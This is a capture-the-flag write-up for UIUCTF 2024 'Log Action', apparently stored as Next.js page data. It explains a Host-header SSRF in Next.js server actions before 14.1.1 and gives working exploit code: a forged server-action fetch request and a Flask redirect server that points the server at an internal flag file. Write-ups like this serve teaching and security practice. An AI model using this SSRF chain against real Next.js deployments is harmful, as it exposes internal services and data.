1:"$Sreact.fragment"
2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
12:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
13:"$Sreact.suspense"
3:T588,"use client";
import { useFormStatus, useFormState } from "react-dom";
import { authenticate } from "@/lib/actions";

export default function LoginPage() {
  const [state, formAction] = useFormState(
    authenticate,
    undefined
  );

  const { pending } = useFormStatus();

  return (
    <>
      <div className="max-w-prose mx-auto flex flex-col gap-4">
        <p className="text-2xl font-bold">
          Login
        </p>
        <form action={formAction} className="flex flex-col gap-4">
          <label className="flex flex-col gap-1">
            <span>Username</span>
            <input
              type="username"
              id="username"
              name="username"
              placeholder="Enter your username"
              required
              minLength={3}
            />
          </label>
          <label className="flex flex-col gap-1">
            <span>Password</span>
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Enter your password"
              required
              minLength={10}
            />
          </label>
          <button type="submit" disabled={pending}>
            Log in
          </button>
          {state ? (
            <span className="text-sm text-red-500">
              {state}
            </span>
          ) : null}
        </form>
      </div>
    </>
  )
}0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"UIUCTF 2024 â€” Log Action"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"I keep trying to log in, but it's not working :'("}],"\n",["$","p","p-1",{"children":["$","a","a-0",{"href":"http://log-action.challenge.uiuc.tf/","children":"http://log-action.challenge.uiuc.tf/"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a simple Next.js + Next Auth site with a simple login / logout implementation:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"tsx"}],"\n",["$","p","p-1",{"children":["The main idea here comes from the ",["$","a","a-0",{"href":"https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps","children":"SSRF in server actions section of this blog"}],"."]}],"\n",["$","p","p-2",{"children":["Essentially, for Next.js < 14.1.1, calls to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"redirect()"}]," in server actions that use a relative path (ex. ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/path"}],") will use the request's ",["$","code","code-2",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"Host"}]," header to construct the absolute URL to redirect to. It then fetches this URL on the server to deliver to the client, resulting in SSRF."]}],"\n",["$","p","p-3",{"children":"Luckily, the challenge is running Next.js 14.1.0 and is therefore vulnerable to this attack!"}],"\n",["$","$L2","pre-1",{"className":"my-2","children":"    \"next\": \"14.1.0\",","language":"json"}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc"]}]}],["$Ld","$Le","$Lf","$L10"],"$L11"]}],"loading":null,"isPartial":false}
4:["$","p","p-4",{"children":["First, we need to find a server action to call that always results in a redirect. Looking in ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/logout/page.tsx"}],","]}]
5:["$","$L2","pre-2",{"className":"my-2","children":"import Link from \"next/link\";\nimport { redirect } from \"next/navigation\";\nimport { signOut } from \"@/auth\";\n\nexport default function Page() {\n  return (\n    <>\n      <h1 className=\"text-2xl font-bold\">Log out</h1>\n      <p>Are you sure you want to log out?</p>\n      <Link href=\"/admin\">\n        Go back\n      </Link>\n      <form\n        action={async () => {\n          \"use server\";\n          await signOut({ redirect: false });\n          redirect(\"/login\");\n        }}\n      >\n        <button type=\"submit\">Log out</button>\n      </form>\n    </>\n  )\n}","language":"tsx"}]
6:["$","p","p-5",{"children":"it looks like we can trigger this inline server action to do just that. We can manually call this action via"}]
7:["$","$L2","pre-3",{"className":"my-2","children":"const formData = new FormData();\nformData.set('1_$ACTION_ID_c3a144622dd5b5046f1ccb6007fea3f3710057de', '');\nformData.set('0', '[\"$K1\"]');\n\nawait (await fetch('http://log-action.challenge.uiuc.tf/logout', {\n    method: 'POST',\n    headers: {\n        'Next-Action': 'c3a144622dd5b5046f1ccb6007fea3f3710057de',\n        // 'Host': '...'\n    },\n    body: formData\n})).text()","language":"js"}]
8:["$","p","p-6",{"children":["editing the ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"Host"}]," header to the URL of our exploit server. We can look in the docker-compose file to find that the flag is statically hosted by ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nginx"}]," at ",["$","code","code-2",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"http://backend/flag.txt"}],":"]}]
9:["$","$L2","pre-4",{"className":"my-2","children":"version: '3'\nservices:\n  frontend:\n    build: ./frontend\n    restart: always\n    environment:\n      - AUTH_TRUST_HOST=http://localhost:3000\n    ports:\n      - \"3000:3000\"\n    depends_on:\n      - backend\n  backend:\n    image: nginx:latest\n    restart: always\n    volumes:\n      - ./backend/flag.txt:/usr/share/nginx/html/flag.txt","language":"yml"}]
a:["$","p","p-7",{"children":["Then, we can set up a Flask server to redirect our ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"redirect()"}]," call to that URL and invoke the logout action to get the flag."]}]
b:["$","$L2","pre-5",{"className":"my-2","children":"from flask import Flask, Response, request, redirect\napp = Flask(__name__)\n\n\n@app.route('/', defaults={'path': ''})\n@app.route('/<path:path>')\ndef catch(path):\n    if request.method == 'HEAD':\n        resp = Response(\"\")\n        resp.headers['Content-Type'] = 'text/x-component'\n        return resp\n    return redirect('http://backend/flag.txt')","language":"py"}]
c:["$","$L2","pre-6",{"className":"my-2","children":"uiuctf{close_enough_nextjs_server_actions_welcome_back_php}"}]
d:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
e:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
f:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
10:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
11:["$","$L12",null,{"children":["$","$13",null,{"name":"Next.MetadataOutlet","children":"$@14"}]}]
14:null
